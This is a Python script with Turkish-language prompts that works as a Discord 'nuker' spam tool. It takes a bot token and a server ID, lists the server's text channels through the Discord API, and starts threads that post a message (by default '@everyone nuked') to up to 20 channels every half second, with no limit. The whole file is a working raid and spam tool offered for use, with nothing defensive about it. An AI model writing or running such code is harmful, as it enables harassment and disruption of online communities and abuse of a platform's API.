import requests
import threading
import time
from rich.console import Console

console = Console()


def run():
    token = console.input("[bold white]  Bot Token: [/]").strip()
    if not token:
        console.print("[red]  Token bos olamaz.[/]")
        return
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    guild_id = console.input("[bold white]  Sunucu ID: [/]").strip()
    message = console.input("[bold white]  Mesaj (varsayilan '@everyone nuked'): [/]").strip() or "@everyone nuked"

    with console.status("[#818cf8]  Kanallar aliniyor...[/]", spinner="moon"):
        r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, timeout=10)

    if r.status_code != 200:
        console.print("[red]  Kanallar alinamadi.[/]")
        return

    channels = [c for c in r.json() if c.get("type") in (0, 5)]
    console.print(f"[#818cf8]  {len(channels)} kanala mesaj gonderiliyor...[/]")
    console.print("[yellow]  Ctrl+C ile durdurun.[/]")

    def spam_channel(ch):
        while True:
            try:
                requests.post(f"https://discord.com/api/v9/channels/{ch['id']}/messages",
                              headers=headers, json={"content": message}, timeout=10)
            except Exception:
                pass
            time.sleep(0.5)

    try:
        threads = []
        for ch in channels[:20]:
            t = threading.Thread(target=spam_channel, args=(ch,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        console.print("\n[dim]  Durduruldu.[/]")
